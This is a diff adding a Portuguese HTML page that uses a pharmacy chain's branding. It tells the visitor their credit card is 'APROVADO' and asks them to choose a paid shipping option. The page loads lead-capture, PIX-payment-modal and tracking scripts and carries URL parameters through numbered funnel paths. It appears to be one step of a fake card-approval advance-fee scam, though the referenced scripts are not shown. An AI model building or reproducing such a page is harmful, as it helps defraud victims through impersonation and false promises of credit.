@@ -1,0 +1,151 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/ml/progress.js"></script><script src="/api/public/pixel.js"></script><script src="/ml/lead-capture.js" defer></script><script src="/ml/pix-modal.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <title>Cartão</title>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script src="/ml/utmify.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+            color: #333;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #d5d8dd;
+            background-color: #e9ebee;
+        }
+        .logo {
+            width: 125px;
+            padding: 10px;
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .shipping-option {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .shipping-option:hover {
+            background-color: #f5f5f5;
+        }
+        .shipping-info {
+            flex: 1;
+            margin-left: 15px;
+        }
+        .shipping-price {
+            font-weight: bold;
+            color: #1f1f1f;
+            font-size: 18px;
+        }
+        .shipping-time {
+            color: #666;
+            font-size: 14px;
+        }
+        .button {
+            background-color: #14315c;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Drogarias Campeã" class="logo">
+    </div>
+
+    <div class="content">
+        <h1>Escolha o método de envio</h1>
+        <p style="color: #666; margin-bottom: 30px; text-align: center;">
+            Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong>APROVADO</strong>
+        </p>
+
+        <div class="shipping-option" onclick="window.location.href = buildUrlWithParams('/ml/2/4/14-1/')">
+            <span style="font-size: 32px; color: #002d74;">📦</span>
+            <div class="shipping-info">
+                <div style="font-size: 18px; font-weight: bold;">SEDEX</div>
+                <div class="shipping-time">1 dia útil</div>
+            </div>
+            <div class="shipping-price">R$ 28,30</div>
+        </div>
+
+        <div class="shipping-option" onclick="window.location.href = buildUrlWithParams('/ml/2/4/14-3/')">
+            <span style="font-size: 32px; color: #002d74;">📬</span>
+            <div class="shipping-info">
+                <div style="font-size: 18px; font-weight: bold;">PAC</div>
+                <div class="shipping-time">7 a 10 dias úteis</div>
+            </div>
+            <div class="shipping-price">R$ 24,30</div>
+        </div>
+
+        
+
+        <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                    Drogarias Campeã Brasil LTDA | CNPJ: 79.379.491.0008-50
+                </p>
+                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                    Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+                </p>
+                <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                    © 2025 - Todos os direitos reservados
+                </p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+    </script>
+
+
+
+
+</body></html>
